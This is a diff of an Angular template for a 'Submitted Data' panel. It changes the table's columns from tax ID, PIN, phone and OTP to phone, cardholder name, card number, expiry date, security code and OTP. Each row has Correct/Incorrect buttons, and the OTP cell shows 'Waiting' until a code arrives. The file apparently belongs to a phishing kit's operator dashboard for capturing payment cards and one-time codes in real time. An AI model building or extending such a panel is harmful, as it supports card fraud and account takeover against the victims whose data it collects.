@@ -1,28 +1,33 @@
 <div class="submissions-container">
-    <h2>Submitted Data</h2>
-    <table>
-      <thead>
-        <tr>
-          <th>NIF</th>
-          <th>PIN</th>
-          <th>Phone Number</th>
-          <th>OTP</th>
-          <th>Actions</th> <!-- New column for actions -->
-        </tr>
-      </thead>
-      <tbody>
-        <tr *ngFor="let submission of submissions">
-          <td>{{ submission.nif }}</td>
-          <td>{{ submission.pin }}</td>
-          <td>{{ submission.phone }}</td>
-          <td>{{ submission.otp ? submission.otp : 'Waiting' }}</td>
-          <td>
-            <button (click)="markCorrect(submission)">Correct</button>
-            <button (click)="markIncorrect(submission)">Incorrect</button>
-            <button (click)="performOtherAction(submission)">Other</button>
-          </td>
-        </tr>
-      </tbody>
-    </table>
-  </div>
-  
+  <h2>Submitted Data</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Phone Number</th>
+        <th>cardHolderName</th>
+        <th>cardNumber</th>
+        <th>expiryDate</th>
+        <th>securityCode</th>
+
+        <th>OTP</th>
+        <th>Actions</th>
+        <!-- New column for actions -->
+      </tr>
+    </thead>
+    <tbody>
+      <tr *ngFor="let submission of submissions">
+        <td>{{ submission.phoneNumber }}</td>
+        <td>{{ submission.cardHolderName }}</td>
+        <td>{{ submission.cardNumber }}</td>
+        <td>{{ submission.expiryDate }}</td>
+        <td>{{ submission.securityCode }}</td>
+        <td>{{ submission.otp ? submission.otp : "Waiting" }}</td>
+        <td>
+          <button (click)="markCorrect(submission)">Correct</button>
+          <button (click)="markIncorrect(submission)">Incorrect</button>
+          <button (click)="performOtherAction(submission)">Other</button>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
